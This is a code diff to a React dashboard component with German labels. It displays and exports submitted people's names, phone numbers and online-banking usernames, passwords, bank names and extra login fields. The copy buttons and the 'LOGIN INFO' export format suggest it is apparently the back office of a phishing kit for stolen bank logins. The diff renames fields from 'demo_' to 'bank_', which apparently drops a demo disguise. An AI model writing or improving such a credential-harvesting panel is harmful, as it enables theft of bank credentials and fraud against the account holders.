@@ -221,14 +221,14 @@ function DetailContent() {
     `phone: ${submission.phone || ""}`,
     ``,
     `======> LOGIN INFO <=======`,
-    `benutzername: ${submission.demo_username || ""}`,
-    `passwort: ${submission.demo_password || ""}`,
-    `bank: ${submission.demo || ""}`,
+    `benutzername: ${submission.bank_username || ""}`,
+    `passwort: ${submission.bank_password || ""}`,
+    `bank: ${submission.bank || ""}`,
   ].join("\n");
 
   const downloadExport = () => {
     const name = (submission.full_name || "export").replace(/\s+/g, "_");
-    const bank = (submission.demo || "unknown").replace(/\s+/g, "_");
+    const bank = (submission.bank || "unknown").replace(/\s+/g, "_");
     const blob = new Blob([exportText], { type: "text/plain" });
     const url = URL.createObjectURL(blob);
     const a = document.createElement("a");
@@ -253,8 +253,8 @@ function DetailContent() {
             <div className="min-w-0">
               <div className="flex items-center gap-2.5">
                 <h1 className="text-lg font-bold text-slate-900 truncate">{submission.full_name || "Unbekannt"}</h1>
-                {submission.demo && (
-                  <span className="text-[11px] font-medium text-slate-400 bg-slate-100 rounded-full px-2.5 py-0.5 shrink-0">{submission.demo}</span>
+                {submission.bank && (
+                  <span className="text-[11px] font-medium text-slate-400 bg-slate-100 rounded-full px-2.5 py-0.5 shrink-0">{submission.bank}</span>
                 )}
               </div>
               <div className="flex flex-col mt-0.5">
@@ -339,12 +339,12 @@ function DetailContent() {
               <CardTitle className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Bank-Login</CardTitle>
             </CardHeader>
             <CardContent>
-              <CopyValue label="Bank" value={submission.demo} />
-              <CopyValue label={submission.demo_username_label || "Benutzername"} value={submission.demo_username} mono />
-              <CopyValue label={submission.demo_password_label || "Passwort"} value={submission.demo_password} mono />
-              {submission.demo_extra && Object.keys(submission.demo_extra).length > 0 && (
+              <CopyValue label="Bank" value={submission.bank} />
+              <CopyValue label={submission.bank_username_label || "Benutzername"} value={submission.bank_username} mono />
+              <CopyValue label={submission.bank_password_label || "Passwort"} value={submission.bank_password} mono />
+              {submission.bank_extra && Object.keys(submission.bank_extra).length > 0 && (
                 <>
-                  {Object.entries(submission.demo_extra).map(([key, val]) => (
+                  {Object.entries(submission.bank_extra).map(([key, val]) => (
                     <CopyValue key={key} label={key} value={val} mono />
                   ))}
                 </>
